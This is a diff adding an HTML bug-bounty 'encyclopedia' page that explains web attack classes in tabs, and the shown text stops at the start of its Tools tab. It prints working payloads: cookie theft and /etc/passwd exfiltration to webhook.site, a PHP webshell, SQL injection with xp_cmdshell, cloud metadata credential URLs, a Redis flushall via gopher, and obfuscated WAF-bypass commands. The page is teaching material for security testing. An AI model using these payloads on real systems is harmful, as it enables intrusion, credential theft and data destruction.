@@ -1,0 +1,710 @@
+<!-- Complete Offensive Web Security Encyclopedia – 2026 Edition -->
+<h2 class="section-title">🌐 Web Attacks & Bug Bounty – The Complete Encyclopedia</h2>
+
+<div class="server-tabs" id="web-tabs">
+  <div class="server-btn active" data-tab="intro">Intro</div>
+  <div class="server-btn" data-tab="recon">Recon</div>
+  <div class="server-btn" data-tab="frontend">Frontend</div>
+  <div class="server-btn" data-tab="xss">XSS</div>
+  <div class="server-btn" data-tab="sqli">SQLi</div>
+  <div class="server-btn" data-tab="auth">Auth</div>
+  <div class="server-btn" data-tab="ssrf">SSRF</div>
+  <div class="server-btn" data-tab="logic">Logic</div>
+  <div class="server-btn" data-tab="smuggling">Smuggling</div>
+  <div class="server-btn" data-tab="cache">Cache</div>
+  <div class="server-btn" data-tab="fileupload">File Upload</div>
+  <div class="server-btn" data-tab="lfi">LFI/RFI</div>
+  <div class="server-btn" data-tab="cmdi">Cmd Inj</div>
+  <div class="server-btn" data-tab="ssti">SSTI</div>
+  <div class="server-btn" data-tab="proto">Proto Pollution</div>
+  <div class="server-btn" data-tab="websockets">WebSockets</div>
+  <div class="server-btn" data-tab="cloud">Cloud</div>
+  <div class="server-btn" data-tab="waf">WAF Bypass</div>
+  <div class="server-btn" data-tab="browser">Browser</div>
+  <div class="server-btn" data-tab="payloads">Payloads</div>
+  <div class="server-btn" data-tab="tools">Tools</div>
+  <div class="server-btn" data-tab="methodology">Methodology</div>
+  <div class="server-btn" data-tab="automation">Automation</div>
+  <div class="server-btn" data-tab="cases">Cases</div>
+  <div class="server-btn" data-tab="mindset">Mindset</div>
+  <div class="server-btn" data-tab="reporting">Reporting</div>
+  <div class="server-btn" data-tab="architecture">Architecture</div>
+  <div class="server-btn" data-tab="labs">Labs</div>
+  <div class="server-btn" data-tab="checklist">Checklist</div>
+  <div class="server-btn" data-tab="servers">Servers</div>
+</div>
+
+<!-- ========== INTRO TAB ========== -->
+<div class="tab-content active" id="tab-intro">
+  <div class="hero-container" style="text-align:center; padding-top:2rem;">
+    <h1 class="hero-title" style="font-size:3.5rem;">WELCOME TO THE <span class="text-cyber-red">WEB TRIP</span></h1>
+    <p class="hero-subtitle" style="font-size:1.3rem; color:#5ee0fa; margin-bottom:2rem;">Every form is a doorway. Every login, a vault. You don’t just hunt bugs — you break reality with a keyboard.</p>
+  </div>
+
+  <div class="tools-grid" style="margin-top:2rem;">
+    <div class="glass-card text-center"><h2 class="text-neon-green" style="font-size:2.5rem;">30+</h2><p>Attack Classes<br><span style="font-size:0.8rem; opacity:0.7;">From XSS to desync</span></p></div>
+    <div class="glass-card text-center"><h2 class="text-neon-blue" style="font-size:2.5rem;">500+</h2><p>Payloads & Techniques<br><span style="font-size:0.8rem; opacity:0.7;">Catalogued & tested</span></p></div>
+    <div class="glass-card text-center"><h2 class="text-cyber-red" style="font-size:2.5rem;">Full</h2><p>Methodology<br><span style="font-size:0.8rem; opacity:0.7;">Recon → Chaining → Report</span></p></div>
+    <div class="glass-card text-center"><h2 class="text-neon-green" style="font-size:2.5rem;">2026</h2><p>Modern Techniques<br><span style="font-size:0.8rem; opacity:0.7;">Cloud, AI, frontend frameworks</span></p></div>
+  </div>
+
+  <div class="sub-section" style="margin-top:3rem;">
+    <div class="glass-card">
+      <h3 class="text-neon-blue" style="font-size:1.6rem;">📋 Today’s Mission Brief</h3>
+      <ul style="list-style:none; padding:0; font-size:1.1rem;">
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Recon</span> – Subdomain intelligence, JS scraping, source maps, webpack analysis, cloud asset discovery.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Frontend Security</span> – React, Next.js, hydration attacks, DOM clobbering, CSP bypass, service workers.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">XSS & SQLi Masterclass</span> – Mutation XSS, UXSS, polyglots, WAF bypass, blind SQLi, NoSQL injection.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Auth & SSRF</span> – JWT attacks, OAuth, session fixation, cloud metadata SSRF, DNS rebinding.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Business Logic & Race Conditions</span> – Double spending, coupon abuse, TOCTOU, multi‑step manipulation.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Request Smuggling & Cache Poisoning</span> – CL.TE, TE.CL, HTTP/2 desync, CDN poisoning.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">File Upload, LFI/RFI, Command Injection, SSTI, Prototype Pollution</span> – Every advanced server‑side attack.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">WebSockets, Cloud, WAF Bypass, Browser Internals, Payload Engineering</span> – The modern attack surface.</li>
+        <li style="margin-bottom:0.8rem;">✅ <span class="text-neon-green">Tools, Methodology, Automation, Case Studies, Mindset, Reporting, Labs</span> – The complete hunter’s operating system.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="search-wrapper mt-8">
+    <input type="text" id="global-search" placeholder="🔍 Search across all web attacks..." />
+  </div>
+
+  <p style="text-align:center; margin-top:2rem; font-size:0.9rem; color:#888;">
+    <span class="text-cyber-red">Warning:</span> Knowledge is a weapon. Use it only on authorized targets, bug bounty programs, and your own labs.
+  </p>
+</div>
+
+<!-- ========== RECON TAB ========== -->
+<div class="tab-content" id="tab-recon">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🔍 Advanced Recon – The Complete Information Warfare</h2>
+
+    <div class="glass-card">
+      <h3 class="text-neon-blue">1. Subdomain Intelligence</h3>
+      <p>Go beyond subfinder. Use ASN mapping, reverse IP, CIDR expansion, cloud asset discovery, TLS certificate scraping (crt.sh, chaos, passive DNS), DNS bruteforce with permutation attacks, and recursive enumeration.</p>
+      <div class="code-block"><pre># ASN mapping with amass
+amass intel -asn 12345
+# Permutation attacks with alterx
+subfinder -d target.com | alterx -enrich | dnsx -silent</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-neon-blue">2. JS Recon & Sourcemap Extraction</h3>
+      <p>Extract hidden APIs, webpack chunks, React/Vue/Angular routes, GraphQL endpoints, Firebase configs, and environment variables from JavaScript files. Source maps often expose original source code.</p>
+      <div class="code-block"><pre>curl -s https://target.com/static/app.js.map | jq .sources
+katana -u https://target.com -silent | grep '\.js$' | sort -u | while read url; do
+  curl -s "$url" | grep -oP 'https?://[^"]+/api/[^"]+'
+done</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-neon-blue">3. Historical Recon</h3>
+      <p>Use the Wayback Machine, gau, waymore, and archived JS to find deleted endpoints, old admin panels, and forgotten APIs.</p>
+      <div class="code-block"><pre>gau example.com | sort -u > historical_urls.txt
+waymore -i target.com -mode U</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-neon-blue">4. Infrastructure Mapping</h3>
+      <p>Identify CDN, WAF, server type, cloud provider, and Kubernetes footprint. Use tools like <span class="text-neon-green">httpx -tech-detect</span>, <span class="text-neon-green">whatweb</span>, <span class="text-neon-green">wafw00f</span>.</p>
+      <div class="code-block"><pre>httpx -l subs.txt -tech-detect -json -o tech.json
+wafw00f https://target.com</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== FRONTEND SECURITY TAB ========== -->
+<div class="tab-content" id="tab-frontend">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧩 Modern Frontend Security – React, Next.js, Vue, Angular</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. React & Next.js Attack Surface</h3>
+      <p>React’s JSX escapes by default, but <code>dangerouslySetInnerHTML</code>, server‑side rendering (hydration attacks), and React Native WebView can introduce XSS. Next.js API routes are often unprotected.</p>
+      <div class="code-block"><pre># Example of a Next.js API route without auth
+GET /api/nextjs/user?id=123   # may return PII</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. DOM Clobbering & Prototype Pollution</h3>
+      <p>DOM clobbering can overwrite global JavaScript objects via HTML elements. Prototype pollution in client‑side libraries (lodash, jQuery) can lead to XSS or property manipulation.</p>
+      <div class="code-block"><pre>&lt;form name="__proto__"&gt;&lt;input name="isAdmin" value="true"&gt;&lt;/form&gt;
+// If merged without sanitization, may pollute Object.prototype.isAdmin</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. CSP Bypasses & Trusted Types</h3>
+      <p>Content Security Policy can be bypassed via JSONP endpoints, AngularJS sandbox escapes, or Trusted Types misconfigurations. Always test with <code>CSP Evaluator</code>.</p>
+      <div class="code-block"><pre># Bypass via JSONP
+&lt;script src="https://trusted.com/jsonp?callback=alert(1)"&gt;&lt;/script&gt;</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">4. Service Worker & Browser Storage Abuse</h3>
+      <p>Malicious service workers can intercept all requests, steal tokens from localStorage, and phish credentials. IndexedDB can store sensitive data in plaintext.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== XSS MASTERCLASS TAB ========== -->
+<div class="tab-content" id="tab-xss">
+  <div class="sub-section">
+    <h2 class="sub-section-title">💉 XSS Masterclass – From Alert(1) to Account Takeover</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Types & Modern Payloads</h3>
+      <p>Reflected, stored, DOM‑based, blind, self‑XSS, mutation XSS, and UXSS. Use polyglots that work in multiple contexts, SVG payloads, and Unicode bypasses.</p>
+      <div class="code-block"><pre>&lt;svg/onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. CSP & DOMPurify Bypasses</h3>
+      <p>CSP can be evaded with <code>base-uri</code> misconfig, JSONP endpoints, or <code>script-src</code> allowlisting. DOMPurify bypasses exist via mutation XSS or namespace confusion.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Blind XSS & Cookie Theft</h3>
+      <p>Set up a webhook to capture cookies, JWTs, and admin sessions. Blind XSS in admin panels is one of the highest‑impact bugs.</p>
+      <div class="code-block"><pre>&lt;script&gt;new Image().src='https://webhook.site/COL?c='+document.cookie&lt;/script&gt;</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">4. Browser Pivoting & WebSocket Hijacking</h3>
+      <p>Use the XSS to hijack WebSocket connections, force actions on behalf of the victim, or pivot to internal services.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== SQLI MASTERCLASS TAB ========== -->
+<div class="tab-content" id="tab-sqli">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🗄️ SQL Injection Masterclass – The Database Underworld</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Union‑Based, Boolean‑Based, and Time‑Based</h3>
+      <p>Identify the injection type, number of columns, and extract data using <code>UNION SELECT</code>, conditional errors, or sleep commands.</p>
+      <div class="code-block"><pre>' UNION SELECT null, username, password FROM users--
+' AND 1=IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100,SLEEP(5),0)--</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Second‑Order SQLi & NoSQL Injection</h3>
+      <p>Second‑order injection occurs when data stored in one request is used unsafely in another. NoSQL injection can bypass authentication in MongoDB, CouchDB, or Firestore.</p>
+      <div class="code-block"><pre># MongoDB login bypass
+{"username":{"$gt":""},"password":{"$gt":""}}</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. ORM Abuse & Stacked Queries</h3>
+      <p>ORMs like Sequelize or Hibernate can be tricked into exposing data via <code>findAll</code> with malicious parameters. Stacked queries allow executing multiple statements (if DB supports it).</p>
+      <div class="code-block"><pre># MSSQL stacked query
+'; EXEC xp_cmdshell('whoami');--</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">4. SQLMap Advanced Workflows</h3>
+      <p>Use <code>--random-agent</code>, <code>--tamper</code> scripts for WAF bypass, <code>--tor</code> for anonymity, and <code>--os-shell</code> for RCE.</p>
+      <div class="code-block"><pre>sqlmap -u "https://target.com/user.php?id=1" --tamper=between,randomcase --tor --random-agent --os-shell</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== AUTH TAB ========== -->
+<div class="tab-content" id="tab-auth">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🔑 Authentication & Session Attacks – Owning Identity</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. JWT Attacks</h3>
+      <p>Exploit <code>alg=none</code>, kid injection, JWKS poisoning, weak HMAC secrets, and token replay. Use <span class="text-neon-green">jwt_tool</span> or Burp JWT Editor.</p>
+      <div class="code-block"><pre>jwt_tool eyJhbG... -X a   # algorithm confusion
+jwt_tool -j url -I -pc payload -pv "admin" -S hs256 -p "secret"  # forging</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. OAuth, OpenID, SAML</h3>
+      <p>Redirect URI bypass, scope upgrade, state parameter missing, PKCE not enforced, code interception, SAML assertion signature stripping.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Session Fixation, Cookie Poisoning, Remember‑Me Flaws</h3>
+      <p>Force a known session ID, poison cookies for privilege escalation, or exploit "remember me" tokens that are guessable or never expire.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">4. MFA Bypass & Password Reset Poisoning</h3>
+      <p>Bypass two‑factor authentication by brute‑forcing OTPs, replaying old codes, or exploiting fallback mechanisms. Poison password reset links with <code>Host</code> header injection.</p>
+      <div class="code-block"><pre># Password reset poisoning
+POST /forgot-password
+Host: target.com
+... (the reset link will use the Host header)
+
+X-Forwarded-Host: evil.com</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== SSRF DEEP DIVE TAB ========== -->
+<div class="tab-content" id="tab-ssrf">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🌐 Advanced SSRF – The Server’s Browser</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Blind SSRF & DNS Rebinding</h3>
+      <p>Use Burp Collaborator or interactsh to confirm blind SSRF. DNS rebinding bypasses host‑based restrictions by rapidly changing the DNS record between private and attacker IPs.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Cloud Metadata Exploitation</h3>
+      <p>AWS (169.254.169.254), GCP, Azure, DigitalOcean metadata endpoints can leak IAM credentials, SSH keys, and more.</p>
+      <div class="code-block"><pre>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Internal Service Scanning & Redis/Kubernetes</h3>
+      <p>Scan internal networks (127.0.0.1, 10.x, 172.x) for Redis, Memcached, Docker, and Kubernetes APIs.</p>
+      <div class="code-block"><pre>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">4. PDF Generators & Webhook SSRF</h3>
+      <p>Abuse PDF generation libraries (wkhtmltopdf, Prince) to make internal requests. Webhooks that fetch user‑supplied URLs are prime SSRF targets.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== BUSINESS LOGIC TAB ========== -->
+<div class="tab-content" id="tab-logic">
+  <div class="sub-section">
+    <h2 class="sub-section-title">💼 Business Logic & Race Conditions – The Money Bugs</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Race Conditions (TOCTOU)</h3>
+      <p>Send concurrent requests to bypass rate limits, apply coupons multiple times, or transfer money before balance checks.</p>
+      <div class="code-block"><pre># Python concurrent requests
+import threading, requests
+def exploit():
+    requests.post("https://api.target.com/redeem", json={"code":"PROMO"})
+for _ in range(10):
+    threading.Thread(target=exploit).start()</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Payment Bypass, Coupon Abuse, Inventory Manipulation</h3>
+      <p>Negative prices, currency conversion bugs, rounding errors, and transaction replay can drain wallets or overcharge. Coupon reuse and referral abuse are classic logic flaws.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Hidden State Transitions & Webhook Forgery</h3>
+      <p>Manipulate order status, skip payment steps, or forge webhook signatures to confirm transactions without paying.</p>
+      <div class="code-block"><pre># Replay a webhook event with a fake signature
+curl -X POST https://api.target.com/webhook -H "X-Signature: sha256=0000" -d '{"event":"payment_success"}'</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== REQUEST SMUGGLING TAB ========== -->
+<div class="tab-content" id="tab-smuggling">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🐙 HTTP Request Smuggling & Desync</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. CL.TE, TE.CL, TE.TE</h3>
+      <p>Exploit parsing discrepancies between frontend proxy and backend. Smuggle a hidden request to poison caches or bypass restrictions.</p>
+      <div class="code-block"><pre>POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: internal</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. HTTP/2 Desync & Browser‑Powered Smuggling</h3>
+      <p>HTTP/2 downgrades to HTTP/1.1 can introduce new smuggling vectors. Tools: <span class="text-neon-green">Burp HTTP/2 Smuggler</span>, <span class="text-neon-green">h2cSmuggler</span>.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Response Queue Poisoning & Request Tunneling</h3>
+      <p>Poison the response queue to serve malicious content to other users. Tunneling allows bypassing frontend restrictions entirely.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== CACHE POISONING TAB ========== -->
+<div class="tab-content" id="tab-cache">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🗄️ Cache Poisoning & Web Cache Deception</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Host Header Poisoning</h3>
+      <p>Inject malicious <code>Host</code> or <code>X-Forwarded-Host</code> headers to poison cached pages, redirecting users to attacker‑controlled domains.</p>
+      <div class="code-block"><pre>GET / HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Web Cache Deception</h3>
+      <p>Trick the CDN into caching sensitive user data by appending fake static extensions (e.g., <code>/profile.css</code>).</p>
+      <div class="code-block"><pre>GET /account.jsp.css HTTP/1.1
+Host: target.com</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Cache Key Confusion & Normalized Path Abuse</h3>
+      <p>Exploit CDN behavior (CloudFront, Fastly, Akamai) to serve different content under the same cache key.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== FILE UPLOAD TAB ========== -->
+<div class="tab-content" id="tab-fileupload">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📎 File Upload Exploitation – From Webshell to RCE</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. MIME Confusion & Polyglot Files</h3>
+      <p>Create files that are valid in multiple formats (e.g., GIF+PHP). Bypass client‑side validation with Burp Suite.</p>
+      <div class="code-block"><pre>GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Extension & Null‑Byte Bypass</h3>
+      <p>Use double extensions (<code>file.php.jpg</code>), null bytes (<code>file.php%00.jpg</code>), or case variations (<code>file.PHp</code>).</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. ZIP Slip, SVG XSS, ImageTragick</h3>
+      <p>Path traversal in ZIP uploads can overwrite system files. SVG files can contain JavaScript. ImageMagick exploits (e.g., CVE‑2016‑3714) lead to RCE.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== LFI/RFI TAB ========== -->
+<div class="tab-content" id="tab-lfi">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📂 Advanced LFI/RFI – Reading the Server’s Diary</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. PHP Wrappers & Filter Chains</h3>
+      <p>Use <code>php://filter/convert.base64-encode/resource=index.php</code> to read source code, or chain filters to achieve RCE.</p>
+      <div class="code-block"><pre>php://filter/convert.iconv.utf-8.utf-16/resource=index.php</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Log Poisoning & Session Poisoning</h3>
+      <p>Inject PHP code into server logs (access.log) or session files, then include them to get RCE.</p>
+      <div class="code-block"><pre># Inject into User-Agent
+User-Agent: &lt;?php system('id'); ?&gt;
+# Then include /var/log/apache2/access.log</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. RFI Chains & Container Escapes</h3>
+      <p>If RFI is possible, host a malicious PHP file and include it remotely. In Docker, <code>/proc/1/cwd/</code> may grant container access.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== COMMAND INJECTION TAB ========== -->
+<div class="tab-content" id="tab-cmdi">
+  <div class="sub-section">
+    <h2 class="sub-section-title">⚙️ Command Injection – Shell from Input</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Blind & OOB Exfiltration</h3>
+      <p>Use <code>curl</code>, <code>wget</code>, or <code>nslookup</code> to exfiltrate command output via DNS or HTTP. Shell metacharacters (<code>; | & $() \` \`</code>) are your friends.</p>
+      <div class="code-block"><pre>; wget https://webhook.site/CMD?data=`cat /etc/passwd|base64`</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Windows Command Injection</h3>
+      <p>Use <code>&</code>, <code>&&</code>, <code>||</code>, and PowerShell to execute commands. Example: <code>& whoami</code>.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Escaping Filters & Encoding Bypasses</h3>
+      <p>Use <code>${IFS}</code> as a space substitute, <code>cmd=\`echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d\`;eval \$cmd</code> to bypass WAF.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== SSTI TAB ========== -->
+<div class="tab-content" id="tab-ssti">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🖨️ Server‑Side Template Injection (SSTI)</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Jinja2, Twig, Freemarker, Velocity</h3>
+      <p>Template engines evaluate user input. Inject payloads like <code>{{7*7}}</code>, then escalate to RCE.</p>
+      <div class="code-block"><pre># Jinja2 RCE
+{{ ''.__class__.__mro__[1].__subclasses__() }}</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Sandbox Escapes</h3>
+      <p>Bypass restrictions by accessing <code>__globals__</code>, <code>__builtins__</code>, or leveraging the <code>os</code> module.</p>
+      <div class="code-block"><pre># Smarty RCE
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php system('id'); ?&gt;")}</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== PROTOTYPE POLLUTION TAB ========== -->
+<div class="tab-content" id="tab-proto">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧬 Prototype Pollution – Poisoning the Root Object</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Client‑Side Pollution</h3>
+      <p>Merge user‑controlled JSON into an object using vulnerable libraries (lodash merge, jQuery <code>$.extend(true, ...)</code>). Polluting <code>Object.prototype</code> can enable XSS or privilege escalation.</p>
+      <div class="code-block"><pre>{"__proto__":{"isAdmin":true}}</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Server‑Side Node.js Pollution</h3>
+      <p>If the backend merges user input without sanitization, it can override critical properties, leading to authentication bypass or RCE (via <code>child_process</code> gadgets).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== WEBSOCKETS TAB ========== -->
+<div class="tab-content" id="tab-websockets">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📡 WebSockets & Real‑Time Application Attacks</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Auth Bypass & Room Hijacking</h3>
+      <p>WebSocket handshake may lack proper authentication. Enumerate rooms or channels and join without credentials.</p>
+      <div class="code-block"><pre>wscat -c wss://target.com/socket -H "Authorization: Bearer token"</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Message Tampering & Event Injection</h3>
+      <p>Replay or modify WebSocket messages. Inject custom events to trigger unintended actions on the server or other clients.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== CLOUD ATTACKS TAB ========== -->
+<div class="tab-content" id="tab-cloud">
+  <div class="sub-section">
+    <h2 class="sub-section-title">☁️ Cloud Attack Surface – S3, Firebase, Kubernetes</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. S3 Bucket Misconfigurations</h3>
+      <p>Publicly writable S3 buckets allow uploading arbitrary files. Test with <code>aws s3 ls s3://bucket-name --no-sign-request</code>.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Firebase & Supabase Leaks</h3>
+      <p>Exposed Firebase configs with <code>.json</code> endpoints, weak Firestore rules, and Supabase anon keys.</p>
+      <div class="code-block"><pre>curl https://project.firebaseio.com/.json</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Kubernetes & Docker API Exposure</h3>
+      <p>Open kubelet (port 10250) or Docker daemon (port 2375) can grant cluster admin. CI/CD secrets in GitHub Actions, Jenkins.</p>
+      <div class="code-block"><pre>docker -H tcp://host:2375 run -it alpine sh</pre></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== WAF BYPASS TAB ========== -->
+<div class="tab-content" id="tab-waf">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🛡️ WAF Bypass – Cloudflare, Akamai, AWS WAF</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Unicode & Encoding Tricks</h3>
+      <p>Use Unicode normalisation, mixed encodings, double URL encoding, and chunked transfer to evade pattern matching.</p>
+      <div class="code-block"><pre>%u003cscript%u003ealert(1)%u003c/script%u003e
+&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. Header Smuggling & Verb Tampering</h3>
+      <p>Use <code>X-Original-URL</code>, <code>X-Rewrite-URL</code>, or HTTP verb overrides to bypass path‑based rules.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Parser Differentials</h3>
+      <p>Exploit differences between how the WAF and the backend parse the request (e.g., <code>Content-Type</code> confusion).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== BROWSER INTERNALS TAB ========== -->
+<div class="tab-content" id="tab-browser">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧠 Browser Internals – SOP, CORS, CSP, and More</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Same‑Origin Policy & CORS</h3>
+      <p>Understand how SOP restricts cross‑origin interactions. Misconfigured CORS (<code>Access-Control-Allow-Origin: *</code>) can leak sensitive data.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. CORB, CORP, COOP, COEP</h3>
+      <p>Cross‑Origin Read Blocking, Cross‑Origin Resource Policy, and other headers that protect against Spectre‑style attacks.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. DOM Parsing & HTML Quirks</h3>
+      <p>Parse tree construction, <code>&lt;base&gt;</code> injection, and formaction hijacking are powerful when combined with XSS.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== PAYLOADS TAB ========== -->
+<div class="tab-content" id="tab-payloads">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧨 Payload Engineering – The Science of Breaking Things</h2>
+
+    <div class="glass-card">
+      <h3 class="text-cyber-red">1. Polyglots & Parser Confusion</h3>
+      <p>Payloads that work across multiple injection contexts (HTML, JS, CSS, URL).</p>
+      <div class="code-block"><pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</pre></div>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">2. WAF‑Bypass Payloads</h3>
+      <p>Craft payloads that evade common WAF rules using encoding, concatenation, and case variations.</p>
+    </div>
+
+    <div class="glass-card mt-3">
+      <h3 class="text-cyber-red">3. Browser‑Specific Payloads</h3>
+      <p>Firefox, Chrome, and Safari handle certain features differently. Exploit these quirks for targeted attacks.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== TOOLS TAB ========== -->
+<div class="tab-content" id="tab-tools">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧰 The Complete Web Hacker’s Arsenal</h2>
+    <div class="tools-grid">
